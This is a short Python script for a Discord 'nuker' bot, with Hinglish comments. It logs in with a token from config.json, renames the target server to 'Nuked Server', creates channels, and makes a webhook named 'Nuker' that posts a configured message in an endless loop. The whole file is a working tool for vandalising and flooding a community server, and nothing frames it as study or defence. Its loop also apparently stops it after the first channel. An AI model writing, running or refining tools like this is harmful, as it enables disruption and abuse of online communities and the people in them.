import discord
import aiohttp
import asyncio
import json

# Config file load karo
with open("config.json", "r") as f:
    config = json.load(f)

TOKEN = config["TOKEN"]
GUILD_ID = config["GUILD_ID"]
CHANNEL_NAME = config["CHANNEL_NAME"]
WEBHOOK_MESSAGE = config["WEBHOOK_MESSAGE"]
SPAM_SPEED = config["SPAM_SPEED"]
CHANNEL_BATCH = config["CHANNEL_BATCH"]

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
client = discord.Client(intents=intents)

async def create_channel(guild):
    for _ in range(CHANNEL_BATCH):  
        channel = await guild.create_text_channel(CHANNEL_NAME)
        await spam_webhook(channel)
        await asyncio.sleep(SPAM_SPEED)  

async def spam_webhook(channel):
    webhook = await channel.create_webhook(name="Nuker")
    async with aiohttp.ClientSession() as session:
        while True:
            await session.post(webhook.url, json={"content": WEBHOOK_MESSAGE})
            await asyncio.sleep(SPAM_SPEED)  

@client.event
async def on_ready():
    print(f"Logged in as {client.user}")
    guild = client.get_guild(GUILD_ID)
    
    if guild:
        await guild.edit(name="Nuked Server")
        await create_channel(guild)
    else:
        print("Guild not found!")

client.run(TOKEN)
